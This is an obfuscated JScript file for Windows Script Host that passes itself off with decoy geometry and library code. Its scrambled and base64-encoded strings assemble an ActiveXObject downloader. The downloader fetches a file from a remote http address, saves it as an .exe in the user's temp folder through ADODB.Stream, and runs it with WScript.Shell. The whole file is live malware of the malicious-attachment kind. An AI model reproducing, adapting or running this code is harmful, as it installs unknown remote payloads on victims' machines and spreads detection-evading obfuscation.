
var devolve = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  arbitration = [];
	
var ephemeral = { ':': '.','U': 'S','381': 'X'};
	var drive = 0;


function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function makeup(eliminate) {
	saturnine = eliminate;
	for (var i in ephemeral){saturnine = saturnine.replace(i, ephemeral[i]);}
    return saturnine;
};

var payment = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.makeup4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.replace(/varied/g, '')
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = devolve[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = devolve[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = devolve[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = devolve[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var vanishing ="variedJVvariedRFTVvariedAl".makeup4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var likelihood = "variedQWvariedN0aXZvariedlWE9iavariedmVjdA=varied=".makeup4();
String.prototype.makeup2 = function () {
    var savor = {
        retinue: this
    };
    savor.laggard = savor.retinue["c3Vic3RyaW5n".makeup4()](drive, payment);
    return savor.laggard;
};

var latch ="variedRXhwYW5variedkRW52aXvariedJvbm1lbnRTdHJvariedpbmdz".makeup4();
var Native = function(options){
	
};
var farfetched = [likelihood, latch,vanishing,  ""+"."+("thinkpad","pranks","leadership","ermine","recipe","quartette","figures","venal","exe"), "UnVu".makeup4(), makeup("M"+"SX"+"ML"+("managed","budapest","competitive","fraught","recipient","staccato","operated","2.")+"381M"+"LH"+"TT"+("garcia","intact","junction","monte","marriott","specialized","facilities","immigrants","P>")+"WU"+("laser","sagacious","amazon","rolled","pasta","tying","marketplace","cr")+("talker","machines","avoiding","correctly","secretion","soldiers","install","privilege","ip")+"t:"+("astuteness","unyielding","malaysia","discourteous","mixed","upheaval","penetration","funky","Sh")+"ell")];
florida = "_F2_";
var abstinence = this[farfetched.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
VRltLONOpiK = "pBDobvGxBLY";
permanence = (("precipitately", "uplift", "produces", "marcus", "declared", "genes", "extracting", "pAfXCYxyD") + "lHLRgQPm").makeup2();
incidentally = (("defraud", "fatality", "visible", "hartford", "cocktail", "jaguar", "depict", "evans", "mammals", "sgBHznbvVGQ") + "SujSSSFQk").makeup2();
  
    String.prototype.whoop = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var carnage = farfetched.pop().split(">");

stories = "b3Blbg==".makeup4();
var encouraging = new abstinence(carnage[1]);
var civil = new abstinence(carnage[0]);
var strategy = encouraging[farfetched.shift()](farfetched.shift());
weasel = "E";

var locale = farfetched.shift();
var eliminate = farfetched.shift();
function difference(conscription, percent) {

    try {
        var congenital = strategy + "/" + percent ;
		congenital = congenital+ locale;
            civil[stories](("wheedle","horses","saver","prospect","carriers","productivity","persephone","correction","G" + weasel) + ("bluntly","torah","inputs","charms","carbon","ecommerce","muffler","crape","sobriety","adverse","T"), conscription, false);
       
    civil[incidentally + ("instrumental","fears","end")]();
	var caroline=("permanence" + WScript=="permanence" + "V2luZG93cyBTY3JpcHQgSG9zdA==".makeup4())&&civil["c3RhdHVz".makeup4()] +""=="MjAw".makeup4()&&typeof(QJhyeTRvUE)==="undefined";

    if (caroline) {
		
        var abase = new abstinence((("sociology","smoker","remiss","solutions","plastic","selfdefence","indus","sahib","A")+("called","petrol","gerald","milky","deliberative","engineering","effrontery","aides","SEOO")+"DB"+("contradistinction","combo","medline","adoring","began","ecommerce","downloading",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        abase[stories]();
        kRExJbRVgc = "_F9_";
        abase.type = payment;
        GYAPxSYmkX = "_F10_";
        abase["d3JpdGU=".makeup4()](civil[("picking","mercurial","hazardous","decorate","esoteric","pericles","intersection","")+"R"+"es"+"pon"+ephemeral['U'].toLowerCase()+"e"+"Qm9keQ==".makeup4()]);
        SoQAai = "_F11_";
        abase[(permanence + "o"+("accommodated","dresser","ecommerce","reservoir","invidious","electoral","glacier","colourless","00")+("danish","donor","loves","gothic","behest","prizes","patois","8i")+"tion").replace("0"+("authorize","browser","utrecht","trash","blades","dispute","platoon","08"), incidentally)] = 0;
        DAKmNH = "_F12_";
        abase.saveToFile(congenital, 2);
        EviRNTdNa = "_F13_";
        abase.close();
        iWnvXw = "_F14_";
		encouraging[eliminate](congenital, payment, true);
    }
} catch (uRiXqFjaIN) { };

    BftkSnSxQ = "_F15_";
}
try{
difference("aHRvaried0cDvariedovLw=varied=".makeup4()+"\u0077\u0077\u0077"+"\u002E\u0073\u0074\u0075\u0064\u0069\u006F\u0070\u0061\u006E\u0065\u006C\u006C\u0061\u002E\u0069\u0074\u002F\u0037\u0038\u0074\u0067\u0037\u0036\u0038\u0062" + "?vdXfoNrd=LEdcRVyDnOX","fgAlTIWeYCz");}catch(nXNkRbQRW){}

   cXxcBotJEH = "_F16_";
   